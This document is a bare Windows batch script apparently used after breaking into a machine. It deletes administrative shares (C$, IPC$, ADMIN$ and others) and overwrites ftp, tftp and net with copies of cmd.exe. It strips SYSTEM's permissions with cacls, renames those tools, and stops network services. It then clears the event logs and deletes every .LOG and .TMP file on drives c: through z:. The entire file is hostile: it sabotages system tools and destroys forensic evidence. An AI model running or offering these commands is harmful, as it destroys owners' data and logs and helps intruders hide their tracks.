   net1 share /delete C$ /y
   net1 share /delete IPC$ /y
   copy %windir%\system32\cmd.exe %windir%\system32\ftp.exe /y
   copy %windir%\system32\cmd.exe %windir%\system32\tftp.exe /y
   copy %windir%\system32\cmd.exe %windir%\system32\net.exe /y
   %windir%\system32\cacls.exe net.exe /E /C /E /C /P SYSTEM:N /y
   %windir%\system32\cacls.exe ftp.exe /E /C /E /C /P SYSTEM:N /y
   %windir%\system32\cacls.exe tftp.exe /E /C /P SYSTEM:N /y
   %windir%\system32\cacls.exe cacls.exe /E /C /P SYSTEM:N /y
   rename %windir%\system32\ftp.exe %windir%\system32\fuk.exe
   rename %windir%\system32\net.exe %windir%\system32\kuf.exe
   rename %windir%\system32\tftp.exe %windir%\system32\ptfm.exe
   net1 share /delete ADMIN$ /y
   net1 stop messenger
   net1 stop netbios
   _dropclearlogs -app
   _dropclearlogs -sys
   _dropclearlogs -sec
   @ECHO OFF
   DEL /Q /F /S c:\*.LOG
   DEL /Q /F /S d:\*.LOG
   DEL /Q /F /S e:\*.LOG
   DEL /Q /F /S f:\*.LOG
   DEL /Q /F /S g:\*.LOG
   DEL /Q /F /S h:\*.LOG
   DEL /Q /F /S i:\*.LOG
   DEL /Q /F /S j:\*.LOG
   DEL /Q /F /S k:\*.LOG
   DEL /Q /F /S l:\*.LOG
   net1 share /delete E$ /y
   DEL /Q /F /S m:\*.LOG
   DEL /Q /F /S n:\*.LOG
   DEL /Q /F /S o:\*.LOG
   DEL /Q /F /S p:\*.LOG
   DEL /Q /F /S q:\*.LOG
   DEL /Q /F /S r:\*.LOG
   DEL /Q /F /S s:\*.LOG
   DEL /Q /F /S t:\*.LOG
   DEL /Q /F /S u:\*.LOG
   DEL /Q /F /S v:\*.LOG
   DEL /Q /F /S w:\*.LOG
   DEL /Q /F /S x:\*.LOG
   DEL /Q /F /S y:\*.LOG
   DEL /Q /F /S z:\*.LOG
   DEL /Q /F /S c:\*.TMP
   DEL /Q /F /S d:\*.TMP
   DEL /Q /F /S e:\*.TMP
   DEL /Q /F /S f:\*.TMP
   DEL /Q /F /S g:\*.TMP
   DEL /Q /F /S h:\*.TMP
   DEL /Q /F /S i:\*.TMP
   DEL /Q /F /S j:\*.TMP
   DEL /Q /F /S k:\*.TMP
   DEL /Q /F /S l:\*.TMP
   DEL /Q /F /S m:\*.TMP
   DEL /Q /F /S n:\*.TMP
   DEL /Q /F /S o:\*.TMP
   DEL /Q /F /S p:\*.TMP
   DEL /Q /F /S q:\*.TMP
   DEL /Q /F /S r:\*.TMP
   DEL /Q /F /S s:\*.TMP
   DEL /Q /F /S t:\*.TMP
   DEL /Q /F /S u:\*.TMP
   DEL /Q /F /S v:\*.TMP
   DEL /Q /F /S w:\*.TMP
   DEL /Q /F /S x:\*.TMP
   DEL /Q /F /S y:\*.TMP
   DEL /Q /F /S z:\*.TMP
   net1 share /delete D$ /y
   @ECHO ON
